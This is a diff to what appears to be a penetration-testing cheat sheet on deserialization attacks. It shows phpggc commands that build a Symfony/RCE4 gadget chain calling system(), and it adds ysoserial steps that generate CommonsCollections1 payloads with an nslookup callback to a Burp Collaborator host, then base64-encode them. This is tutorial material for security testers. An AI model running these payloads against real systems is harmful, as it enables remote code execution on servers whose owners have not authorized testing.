@@ -64,14 +64,14 @@ Usually this gadget chains ask you to specify a function to be called and argume
 <template v-slot:docker>
 
 ```bash
-docker run --rm {{ image-tag phpggc }} -b "Symfony/RCE4" "system" "{{ payload id }}" | clip.exe
+docker run --rm {{ image-tag phpggc }} -b "{{ gadget-chain Symfony/RCE4 }}" "system" "{{ payload id }}" | clip.exe
 ```
 
 </template>
 <template v-slot:cli>
 
 ```bash
-phpggc -b "Symfony/RCE4" "system" "{{ payload id }}" | clip.exe
+phpggc -b "{{ gadget-chain Symfony/RCE4 }}" "system" "{{ payload id }}" | clip.exe
 ```
 
 </template>
@@ -80,6 +80,91 @@ phpggc -b "Symfony/RCE4" "system" "{{ payload id }}" | clip.exe
 ## Java
 
 ### Ysoserial
+
+#### Installation
+
+<smart-tabs variable="tool-docker-vs-cli" :tabs="{'docker': 'Docker', 'cli': 'Command Line'}">
+<template v-slot:docker>
+
+Simply clone the repo, build the image and tag it like you want:
+```bash
+docker build -t {{ image-tag ysoserial }} "https://github.com/frohoff/ysoserial.git#master"
+```
+
+</template>
+<template v-slot:cli>
+
+Download the latest `ysoserial.jar` from
+[JitPack](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
+[![Download Latest Snapshot](https://img.shields.io/badge/download-master-green.svg)](
+    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
+
+</template>
+</smart-tabs>
+
+#### Usage
+
+List the possible gadget chains with no arguments:
+
+<smart-tabs variable="tool-docker-vs-cli" :tabs="{'docker': 'Docker', 'cli': 'Command Line'}">
+<template v-slot:docker>
+
+```bash
+docker run -it ysoserial
+```
+
+</template>
+<template v-slot:cli>
+
+```bash
+java -jar ysoserial.jar
+```
+
+</template>
+</smart-tabs>
+
+Generate a serialized object to exploit your target:
+
+<smart-tabs variable="tool-docker-vs-cli" :tabs="{'docker': 'Docker', 'cli': 'Command Line'}">
+<template v-slot:docker>
+
+```bash
+docker run -it ysoserial "{{ gadget-chain CommonsCollections1 }}" "{{ payload nslookup your.burpcollaborator.net }}"
+```
+
+</template>
+<template v-slot:cli>
+
+```bash
+java -jar ysoserial.jar "{{ gadget-chain CommonsCollections1 }}" "{{ payload nslookup your.burpcollaborator.net }}"
+```
+
+</template>
+</smart-tabs>
+
+The objects will likely be sent on base64 or similar formats instad of using the bytes directly. For this cases `base64 -w 0` is your friend as it will generate base64 in just one line:
+
+<smart-tabs variable="tool-docker-vs-cli" :tabs="{'docker': 'Docker', 'cli': 'Command Line'}">
+<template v-slot:docker>
+
+```bash
+docker run -it ysoserial "{{ gadget-chain CommonsCollections1 }}" "{{ payload nslookup your.burpcollaborator.net }}" | base64 -w 0
+```
+
+</template>
+<template v-slot:cli>
+
+```bash
+java -jar ysoserial.jar "{{ gadget-chain CommonsCollections1 }}" "{{ payload nslookup your.burpcollaborator.net }}" | base64 -w 0
+```
+
+</template>
+</smart-tabs>
+
+You will likely want to test a bunch of gadget chains with Burp's intruder or a script. The following script will help you to create a list with a sample of every serializated exploit:
+
+> TODO: Finish implementing the script
+
 
 ### Using custom gadget chains
 
